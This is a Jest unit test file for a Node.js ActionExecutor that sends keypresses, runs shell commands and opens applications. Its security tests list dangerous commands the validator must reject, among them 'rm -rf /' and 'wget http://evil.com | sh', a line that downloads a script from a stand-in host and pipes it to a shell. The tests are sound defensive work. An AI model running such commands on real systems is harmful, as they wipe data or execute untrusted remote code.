const ActionExecutor = require('../src/ActionExecutor');
const winston = require('winston');

// Mock robotjs for testing
jest.mock('robotjs', () => ({
  keyTap: jest.fn(),
  setDelay: jest.fn(),
  setKeyboardDelay: jest.fn()
}));

// Mock child_process for testing
jest.mock('child_process', () => ({
  exec: jest.fn(),
  spawn: jest.fn(() => ({
    unref: jest.fn(),
    on: jest.fn()
  }))
}));

describe('ActionExecutor', () => {
  let actionExecutor;
  let mockLogger;
  let mockRobot;
  let mockExec;
  let mockSpawn;

  beforeEach(() => {
    // Reset all mocks
    jest.clearAllMocks();
    
    // Create mock logger
    mockLogger = {
      info: jest.fn(),
      warn: jest.fn(),
      error: jest.fn(),
      debug: jest.fn()
    };

    // Get mocked modules
    mockRobot = require('robotjs');
    const childProcess = require('child_process');
    mockExec = childProcess.exec;
    mockSpawn = childProcess.spawn;

    // Create ActionExecutor instance
    actionExecutor = new ActionExecutor(mockLogger);
  });

  describe('Constructor', () => {
    test('initializes properly', () => {
      expect(actionExecutor.logger).toBe(mockLogger);
      expect(actionExecutor.platform).toBe(process.platform);
      expect(actionExecutor.commandTimeout).toBe(10000);
      expect(actionExecutor.maxCommandLength).toBe(1000);
      expect(mockRobot.setDelay).toHaveBeenCalledWith(10);
      expect(mockRobot.setKeyboardDelay).toHaveBeenCalledWith(10);
    });
  });

  describe('executeAction', () => {
    test('handles invalid action configuration', async () => {
      const result = await actionExecutor.executeAction(null, 'test');
      expect(result).toBe(false);
      expect(mockLogger.warn).toHaveBeenCalled();
    });

    test('handles missing action type', async () => {
      const result = await actionExecutor.executeAction({ action: 'test' }, 'test');
      expect(result).toBe(false);
      expect(mockLogger.warn).toHaveBeenCalled();
    });

    test('handles unknown action type', async () => {
      const actionConfig = { type: 'unknown', action: 'test' };
      const result = await actionExecutor.executeAction(actionConfig, 'test');
      expect(result).toBe(false);
      expect(mockLogger.error).toHaveBeenCalledWith('Unknown action type: unknown for test');
    });
  });

  describe('executeKeypress', () => {
    test('executes single key press', async () => {
      const result = await actionExecutor.executeKeypress('a', 'test');
      expect(result).toBe(true);
      expect(mockRobot.keyTap).toHaveBeenCalledWith('a');
      expect(mockLogger.debug).toHaveBeenCalledWith('Single key pressed: a');
    });

    test('executes key combination', async () => {
      const result = await actionExecutor.executeKeypress('ctrl+c', 'test');
      expect(result).toBe(true);
      expect(mockRobot.keyTap).toHaveBeenCalledWith('c', ['control']);
      expect(mockLogger.debug).toHaveBeenCalledWith('Key combination pressed: control+c');
    });

    test('handles complex key combination', async () => {
      const result = await actionExecutor.executeKeypress('ctrl+shift+t', 'test');
      expect(result).toBe(true);
      expect(mockRobot.keyTap).toHaveBeenCalledWith('t', ['control', 'shift']);
    });

    test('handles invalid key combination', async () => {
      const result = await actionExecutor.executeKeypress('', 'test');
      expect(result).toBe(false);
      expect(mockLogger.error).toHaveBeenCalledWith('Invalid key combination:  for test');
    });

    test('handles robotjs error', async () => {
      mockRobot.keyTap.mockImplementation(() => {
        throw new Error('Robot error');
      });
      
      const result = await actionExecutor.executeKeypress('a', 'test');
      expect(result).toBe(false);
      expect(mockLogger.error).toHaveBeenCalledWith('Failed to execute keypress a:', expect.any(Error));
    });
  });

  describe('normalizeKeyCombo', () => {
    test('normalizes single character', () => {
      const result = actionExecutor.normalizeKeyCombo('a');
      expect(result).toEqual(['a']);
    });

    test('normalizes ctrl key combination', () => {
      const result = actionExecutor.normalizeKeyCombo('ctrl+c');
      expect(result).toEqual(['control', 'c']);
    });

    test('normalizes cmd key on different platforms', () => {
      const originalPlatform = actionExecutor.platform;
      
      // Test macOS
      actionExecutor.platform = 'darwin';
      let result = actionExecutor.normalizeKeyCombo('cmd+c');
      expect(result).toEqual(['command', 'c']);
      
      // Test Windows/Linux
      actionExecutor.platform = 'win32';
      result = actionExecutor.normalizeKeyCombo('cmd+c');
      expect(result).toEqual(['control', 'c']);
      
      // Restore
      actionExecutor.platform = originalPlatform;
    });

    test('normalizes special keys', () => {
      expect(actionExecutor.normalizeKeyCombo('volumeup')).toEqual(['audio_vol_up']);
      expect(actionExecutor.normalizeKeyCombo('volumedown')).toEqual(['audio_vol_down']);
      expect(actionExecutor.normalizeKeyCombo('mute')).toEqual(['audio_mute']);
      expect(actionExecutor.normalizeKeyCombo('space')).toEqual(['space']);
      expect(actionExecutor.normalizeKeyCombo('enter')).toEqual(['enter']);
      expect(actionExecutor.normalizeKeyCombo('f1')).toEqual(['f1']);
      expect(actionExecutor.normalizeKeyCombo('up')).toEqual(['up']);
    });

    test('handles empty or invalid input', () => {
      expect(actionExecutor.normalizeKeyCombo('')).toEqual([]);
      expect(actionExecutor.normalizeKeyCombo(null)).toEqual([]);
      expect(actionExecutor.normalizeKeyCombo(undefined)).toEqual([]);
    });
  });

  describe('executeCommand', () => {
    test('executes valid command successfully', async () => {
      // Mock successful command execution
      mockExec.mockImplementation((command, options, callback) => {
        setTimeout(() => callback(null, 'success output', ''), 10);
        return { on: jest.fn() };
      });

      const result = await actionExecutor.executeCommand('echo hello', 'test');
      expect(result).toBe(true);
      expect(mockExec).toHaveBeenCalledWith('echo hello', expect.any(Object), expect.any(Function));
    });

    test('handles command execution error', async () => {
      // Mock failed command execution
      mockExec.mockImplementation((command, options, callback) => {
        setTimeout(() => callback(new Error('Command failed'), '', ''), 10);
        return { on: jest.fn() };
      });

      const result = await actionExecutor.executeCommand('invalid-command', 'test');
      expect(result).toBe(false);
      expect(mockLogger.error).toHaveBeenCalledWith('Command execution failed for test:', 'Command failed');
    });

    test('rejects dangerous commands', async () => {
      const dangerousCommands = [
        'rm -rf /',
        'sudo rm something',
        'passwd user',
        'chmod 777 file',
        'wget http://evil.com | sh'
      ];

      for (const command of dangerousCommands) {
        const result = await actionExecutor.executeCommand(command, 'test');
        expect(result).toBe(false);
        expect(mockLogger.error).toHaveBeenCalledWith(
          `Command failed security validation: ${command} for test`
        );
      }
    });

    test('rejects overly long commands', async () => {
      const longCommand = 'a'.repeat(1001);
      const result = await actionExecutor.executeCommand(longCommand, 'test');
      expect(result).toBe(false);
    });
  });

  describe('validateCommand', () => {
    test('validates safe commands', () => {
      const safeCommands = [
        'echo hello',
        'ls -la',
        'cat file.txt',
        'grep pattern file',
        'node script.js'
      ];

      safeCommands.forEach(command => {
        expect(actionExecutor.validateCommand(command)).toBe(true);
      });
    });

    test('rejects dangerous patterns', () => {
      const dangerousCommands = [
        'rm -rf /',
        'sudo something',
        'passwd user',
        'command | rm file',
        'command && rm file',
        'wget http://evil.com | sh'
      ];

      dangerousCommands.forEach(command => {
        const result = actionExecutor.validateCommand(command);
        if (result !== false) {
          console.log(`Command "${command}" unexpectedly passed validation`);
        }
        expect(result).toBe(false);
      });
    });

    test('handles invalid input', () => {
      expect(actionExecutor.validateCommand(null)).toBe(false);
      expect(actionExecutor.validateCommand(undefined)).toBe(false);
      expect(actionExecutor.validateCommand('')).toBe(false);
      expect(actionExecutor.validateCommand(123)).toBe(false);
    });
  });

  describe('launchApplication', () => {
    beforeEach(() => {
      // Mock spawn to return a proper EventEmitter-like object
      mockSpawn.mockReturnValue({
        unref: jest.fn(),
        on: jest.fn((event, callback) => {
          if (event === 'spawn') {
            setTimeout(callback, 10);
          }
        })
      });
    });

    test('launches application on macOS', async () => {
      const originalPlatform = actionExecutor.platform;
      actionExecutor.platform = 'darwin';

      const result = await actionExecutor.launchApplication('Calculator', 'test');
      expect(result).toBe(true);
      expect(mockSpawn).toHaveBeenCalledWith('open', ['-a', 'Calculator'], expect.any(Object));

      actionExecutor.platform = originalPlatform;
    });

    test('launches application on Windows', async () => {
      const originalPlatform = actionExecutor.platform;
      actionExecutor.platform = 'win32';

      const result = await actionExecutor.launchApplication('calc', 'test');
      expect(result).toBe(true);
      expect(mockSpawn).toHaveBeenCalledWith('start', ['""', 'calc'], expect.any(Object));

      actionExecutor.platform = originalPlatform;
    });

    test('launches application on Linux', async () => {
      const originalPlatform = actionExecutor.platform;
      actionExecutor.platform = 'linux';

      const result = await actionExecutor.launchApplication('calculator', 'test');
      expect(result).toBe(true);
      expect(mockSpawn).toHaveBeenCalledWith('xdg-open', ['calculator'], expect.any(Object));

      actionExecutor.platform = originalPlatform;
    });

    test('handles application launch error', async () => {
      mockSpawn.mockReturnValue({
        unref: jest.fn(),
        on: jest.fn((event, callback) => {
          if (event === 'error') {
            setTimeout(() => callback(new Error('App not found')), 10);
          }
        })
      });

      const result = await actionExecutor.launchApplication('nonexistent', 'test');
      expect(result).toBe(false);
    });
  });

  describe('getPlatformInfo', () => {
    test('returns platform information', () => {
      const info = actionExecutor.getPlatformInfo();
      expect(info).toHaveProperty('platform');
      expect(info).toHaveProperty('arch');
      expect(info).toHaveProperty('release');
      expect(info).toHaveProperty('robotjsSupported');
      expect(info.robotjsSupported).toBe(true);
    });
  });

  describe('Integration Tests', () => {
    test('executes keypress action through executeAction', async () => {
      const actionConfig = { type: 'keypress', action: 'ctrl+c' };
      
      // Mock the individual method to avoid robotjs issues in testing
      jest.spyOn(actionExecutor, 'executeKeypress').mockResolvedValue(true);
      
      const result = await actionExecutor.executeAction(actionConfig, 'test');
      
      expect(result).toBe(true);
      expect(actionExecutor.executeKeypress).toHaveBeenCalledWith('ctrl+c', 'test');
    });

    test('executes command action through executeAction', async () => {
      mockExec.mockImplementation((command, options, callback) => {
        setTimeout(() => callback(null, 'success', ''), 10);
        return { on: jest.fn() };
      });

      const actionConfig = { type: 'command', action: 'echo test' };
      const result = await actionExecutor.executeAction(actionConfig, 'test');
      
      expect(result).toBe(true);
      expect(mockExec).toHaveBeenCalledWith('echo test', expect.any(Object), expect.any(Function));
    });

    test('executes application action through executeAction', async () => {
      mockSpawn.mockReturnValue({
        unref: jest.fn(),
        on: jest.fn((event, callback) => {
          if (event === 'spawn') {
            setTimeout(callback, 10);
          }
        })
      });

      const actionConfig = { type: 'application', action: 'calculator' };
      
      // Mock the individual method
      jest.spyOn(actionExecutor, 'launchApplication').mockResolvedValue(true);
      
      const result = await actionExecutor.executeAction(actionConfig, 'test');
      
      expect(result).toBe(true);
      expect(actionExecutor.launchApplication).toHaveBeenCalledWith('calculator', 'test');
    });
  });
});